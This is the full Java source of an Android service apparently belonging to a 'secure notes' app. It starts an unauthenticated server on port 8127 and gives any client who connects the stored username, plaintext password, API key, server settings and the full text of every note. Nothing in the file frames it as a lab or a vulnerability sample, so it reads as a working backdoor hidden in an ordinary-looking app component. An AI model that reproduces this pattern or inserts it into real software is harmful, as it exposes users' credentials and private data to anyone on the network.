package com.securenotes.app;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;
import java.io.IOException;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.List;

public class NetworkService extends Service {
    private ServerSocket serverSocket;
    private Thread serverThread;
    private boolean isRunning = false;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startServer();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void startServer() {
        if (isRunning) return;

        serverThread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    serverSocket = new ServerSocket(8127);
                    isRunning = true;

                    while (isRunning) {
                        Socket client = serverSocket.accept();
                        handleClient(client);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });
        serverThread.start();
    }

    private void handleClient(Socket client) {
        try {
            OutputStream out = client.getOutputStream();
            StringBuilder response = new StringBuilder();

            response.append("HTTP/1.1 200 OK\r\n");
            response.append("Content-Type: application/json\r\n");
            response.append("\r\n");
            response.append("{\n");
            response.append("  \"status\": \"active\",\n");

            SharedPreferences userPrefs = getSharedPreferences("user_prefs", MODE_PRIVATE);
            SharedPreferences appSettings = getSharedPreferences("app_settings", MODE_PRIVATE);

            response.append("  \"user\": {\n");
            response.append("    \"username\": \"").append(userPrefs.getString("username", "")).append("\",\n");
            response.append("    \"password\": \"").append(userPrefs.getString("password", "")).append("\"\n");
            response.append("  },\n");

            response.append("  \"settings\": {\n");
            response.append("    \"server\": \"").append(appSettings.getString("server", "")).append("\",\n");
            response.append("    \"port\": \"").append(appSettings.getString("port", "")).append("\",\n");
            response.append("    \"api_key\": \"").append(appSettings.getString("api_key", "")).append("\",\n");
            response.append("    \"sync_enabled\": ").append(appSettings.getBoolean("sync_enabled", false)).append("\n");
            response.append("  },\n");

            DatabaseHelper dbHelper = new DatabaseHelper(NetworkService.this);
            List<Note> notes = dbHelper.getAllNotes();
            response.append("  \"notes\": [\n");
            for (int i = 0; i < notes.size(); i++) {
                Note note = notes.get(i);
                response.append("    {\n");
                response.append("      \"id\": ").append(note.getId()).append(",\n");
                response.append("      \"title\": \"").append(note.getTitle()).append("\",\n");
                response.append("      \"content\": \"").append(note.getContent()).append("\",\n");
                response.append("      \"timestamp\": ").append(note.getTimestamp()).append("\n");
                response.append("    }");
                if (i < notes.size() - 1) response.append(",");
                response.append("\n");
            }
            response.append("  ]\n");
            response.append("}");

            out.write(response.toString().getBytes());
            out.flush();
            client.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        try {
            if (serverSocket != null && !serverSocket.isClosed()) {
                serverSocket.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}